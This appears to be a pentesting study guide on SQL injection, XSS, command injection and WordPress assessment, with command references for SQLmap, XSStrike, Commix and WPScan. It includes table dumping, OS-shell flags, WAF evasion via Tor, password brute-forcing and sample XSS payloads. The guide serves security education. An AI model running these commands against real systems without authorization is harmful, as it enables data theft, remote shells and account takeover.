Day 12 — Web Security (Injection & CMS Assessment)
Tools ● SQLmap ● XSStrike ● Commix ● WPScan
Topics ● SQL Injection
Concepts ● XSS Testing Concepts ● CMS Assessment
A complete reference covering database injection, cross-site scripting detection, OS command injection, and CMS-specific vulnerability assessment — using SQLmap, XSStrike, Commix, and WPScan.

## Topics & Concepts

### 1. SQL Injection (SQLi)

**What it is:** A vulnerability where user-supplied input is inserted into a SQL query without proper sanitization, allowing an attacker to alter the query's logic — read/modify database contents, bypass authentication, or in severe cases execute OS commands.

**Common types:**
- **In-band (classic) SQLi** — results returned directly in the application response.
  - *Error-based:* Forces the database to throw an error that leaks information (table names, versions).
  - *Union-based:* Uses the `UNION SELECT` statement to combine attacker-controlled queries with the original query's output.
- **Blind SQLi** — no direct output; attacker infers data indirectly.
  - *Boolean-based:* Page behavior changes (true/false) based on injected conditions.
  - *Time-based:* Uses functions like `SLEEP()` to infer true/false via response delay.
- **Out-of-band SQLi** — Data is exfiltrated through a different channel (DNS, HTTP requests) when in-band retrieval isn't possible.

**Why it matters:** SQLi remains one of the most damaging web vulnerabilities (OWASP Top 10 — Injection) because it can lead to full database compromise, authentication bypass, and sometimes RCE via stacked queries or `xp_cmdshell` (MSSQL).

**Testing approach:** Identify injectable parameters (GET/POST/headers/cookies) → test with basic payloads (`'`, `"`, `OR 1=1--`) → confirm via error messages or timing → escalate to full extraction with tools like SQLmap.

---

### 2. XSS Testing Concepts (Cross-Site Scripting)

**What it is:** A vulnerability where an attacker injects malicious client-side scripts (usually JavaScript) into web pages viewed by other users, due to improper input sanitization/output encoding.

**Types:**
- **Reflected XSS:** Payload is part of the request and immediately reflected in the response (e.g., a search query echoed back unescaped). Requires tricking a victim into clicking a crafted link.
- **Stored XSS:** Payload is saved on the server (comments, profile fields) and served to every user who views that content — more dangerous, no victim interaction needed per-attack.
- **DOM-based XSS:** Vulnerability exists entirely in client-side JavaScript — the payload never touches the server; it's processed by insecure DOM operations like `innerHTML`, `document.write()`, or `eval()`.

**Testing methodology:**
1. Identify all input points (URL params, forms, headers, JSON bodies).
2. Inject context-breaking payloads: `<script>alert(1)</script>`, `"><img src=x onerror=alert(1)>`, `'-alert(1)-'`.
3. Check where/how input is reflected (HTML body, attribute, JS variable, URL) — the correct payload depends on injection context.
4. Confirm execution (alert box, console log, or blind XSS callback via services like Burp Collaborator).
5. Assess impact: session theft (`document.cookie`), keylogging, phishing overlays, CSRF chaining.

**Key defenses to check for:** Content Security Policy (CSP), output encoding, `HttpOnly`/`Secure` cookie flags, input validation/allow-listing.

---

### 3. CMS Assessment (Content Management System)

**What it is:** Assessing platforms like WordPress, Joomla, or Drupal for vulnerabilities arising from the core software, installed plugins/themes, misconfigurations, or outdated versions.

**Why CMS platforms are high-value targets:**
- Extremely common (WordPress alone powers a huge share of the web), so vulnerabilities are well-documented and widely exploitable.
- Plugin/theme ecosystems are third-party and inconsistently maintained — most real-world CMS compromises come from vulnerable plugins, not CMS core.
- Predictable file structures (`wp-login.php`, `wp-content/plugins/`) make enumeration easy.

**Assessment methodology:**
1. **Fingerprint** the CMS and version (via headers, meta generator tags, static file paths).
2. **Enumerate** installed plugins, themes, and their versions.
3. **Cross-reference** enumerated versions against known CVE databases.
4. **Enumerate users** (often exposed via author archive URLs or REST API endpoints).
5. **Test authentication** — brute force protections, default credentials.
6. **Check for exposed config/backup files** (`wp-config.php.bak`, `.git/`, etc.).

---

## Tools

### 1. SQLmap

**How it works:** SQLmap is an automated SQL injection detection and exploitation framework. Given a URL or request, it systematically injects a wide range of payloads into parameters, analyzes responses (errors, timing, content differences) to detect injectable points, identifies the back-end DBMS, and then offers modules to enumerate/dump databases, read/write files, or even get an OS shell (where DB privileges allow).

**Purpose:** Turns what would be manual, tedious blind/error-based SQLi testing into an automated pipeline — from detection to full data exfiltration.

**Important commands:**

```bash
# Basic scan against a URL with a GET parameter
sqlmap -u "http://target.com/item?id=1"

# Test a POST request (data from a request file, e.g. captured in Burp)
sqlmap -r request.txt

# Specify a parameter to test explicitly
sqlmap -u "http://target.com/item?id=1" -p id

# Use cookies / auth headers
sqlmap -u "http://target.com/item?id=1" --cookie="PHPSESSID=abc123"

# List available databases
sqlmap -u "http://target.com/item?id=1" --dbs

# List tables in a specific database
sqlmap -u "http://target.com/item?id=1" -D dbname --tables

# Dump a specific table
sqlmap -u "http://target.com/item?id=1" -D dbname -T users --dump

# Increase test aggressiveness/thoroughness
sqlmap -u "http://target.com/item?id=1" --level=5 --risk=3

# Attempt to get an OS shell (requires FILE/DBA privileges)
sqlmap -u "http://target.com/item?id=1" --os-shell

# Use Tor/random user-agent to evade basic WAFs
sqlmap -u "http://target.com/item?id=1" --tor --random-agent
```

**Notes:** `--level` (1–5) controls how many injection points/payload variants are tried; `--risk` (1–3) controls how "dangerous"/disruptive payloads (e.g. those that could modify data) are attempted. Always start with defaults on production-like targets.

---

### 2. XSStrike

**How it works:** XSStrike is a Python-based XSS detection tool that goes beyond simple payload-fuzzing. It crawls the target, parses response context (HTML tag, attribute, script block) to craft context-aware payloads, uses a built-in fuzzing engine, and can detect DOM-based XSS via static analysis of JavaScript. It also has WAF detection/fingerprinting to adapt payloads.

**Purpose:** More intelligent than a plain payload-list scanner — reduces false positives by understanding *where* the injection lands before deciding *what* to inject.

**Important commands:**

```bash
# Basic scan on a single URL
python3 xsstrike.py -u "http://target.com/search?q=test"

# Crawl the target and test all discovered forms/params
python3 xsstrike.py -u "http://target.com" --crawl

# Test a POST request with data
python3 xsstrike.py -u "http://target.com/search" --data "q=test"

# Use with authenticated session (cookie)
python3 xsstrike.py -u "http://target.com/search?q=test" --cookie "session=abc123"

# Enable blind XSS payload injection (for stored XSS testing via a callback service)
python3 xsstrike.py -u "http://target.com/comment" --blind

# Fuzzing mode: test how the target handles special characters
python3 xsstrike.py -u "http://target.com/search?q=test" --fuzzer
```

**Notes:** Best used after manual context identification (confirm the parameter reflects at all) — XSStrike is good at then determining the precise payload needed to break out of that context.

---

### 3. Commix

**How it works:** Commix (Command Injection Exploiter) automates detection and exploitation of OS command injection vulnerabilities. It injects a range of shell metacharacter payloads (`;`, `|`, `&&`, backticks, subshells) into parameters, and evaluates response differences/time delays to confirm command execution, then allows the tester to run arbitrary OS commands through the vulnerable parameter.

**Purpose:** Same role for command injection that SQLmap plays for SQL injection — automates the discovery of injectable parameters and provides a shell-like interface once confirmed.

**Important commands:**

```bash
# Basic test against a URL parameter
python3 commix.py --url="http://target.com/ping?ip=127.0.0.1"

# Test a POST request
python3 commix.py --url="http://target.com/ping" --data="ip=127.0.0.1"

# Use a captured request file (from Burp)
python3 commix.py --request-file=request.txt

# Specify injection technique explicitly (classic, time-based, file-based, eval-based)
python3 commix.py --url="http://target.com/ping?ip=127.0.0.1" --technique=classic

# Set a custom cookie/session for authenticated testing
python3 commix.py --url="http://target.com/ping?ip=127.0.0.1" --cookie="PHPSESSID=abc123"

# Drop into an interactive OS shell once injection is confirmed
python3 commix.py --url="http://target.com/ping?ip=127.0.0.1" --os-shell
```

**Notes:** Command injection often hides behind features that shell out to system utilities (ping, traceroute, file conversion tools) — always check parameters tied to such functionality first.

---

### 4. WPScan

**How it works:** WPScan is a black-box WordPress vulnerability scanner. It fingerprints the WordPress version, enumerates installed plugins/themes (via passive checks and, optionally, more aggressive brute-force path checks), matches findings against WPScan's vulnerability database (WPVulnDB/WPScan API), enumerates usernames, and can perform password brute-forcing against login endpoints.

**Purpose:** Purpose-built for the CMS assessment workflow described above — automates fingerprinting + enumeration + vulnerability correlation specifically for WordPress sites.

**Important commands:**

```bash
# Basic scan of a WordPress site
wpscan --url http://target.com

# Enumerate installed plugins (vulnerable ones only, or all)
wpscan --url http://target.com --enumerate vp   # vulnerable plugins
wpscan --url http://target.com --enumerate ap   # all plugins

# Enumerate themes
wpscan --url http://target.com --enumerate vt

# Enumerate usernames
wpscan --url http://target.com --enumerate u

# Use an API token to check against the live vulnerability database
wpscan --url http://target.com --api-token YOUR_TOKEN

# Password brute-force against known usernames
wpscan --url http://target.com --passwords rockyou.txt --usernames admin

# Set a custom User-Agent / stealth options
wpscan --url http://target.com --user-agent "Mozilla/5.0" --random-user-agent
```

**Notes:** An API token (free tier available) is required to pull live CVE data from the WPScan vulnerability database — without it, you only get fingerprinting, not vulnerability matching.

---

### Quick Summary Table

| Tool | Targets | Core Technique | Key Flag |
|---|---|---|---|
| SQLmap | SQL Injection | Automated payload injection + DBMS fingerprinting | `--dbs`, `--dump` |
| XSStrike | XSS | Context-aware payload crafting + DOM analysis | `--crawl`, `--blind` |
| Commix | Command Injection | Shell metacharacter injection + response analysis | `--os-shell` |
| WPScan | CMS (WordPress) | Fingerprinting + vulnerability DB correlation | `--enumerate vp` |

Let me know if you'd like Day 13 continuing into a related area (e.g., authentication testing, API security, or advanced Burp/ZAP automation).
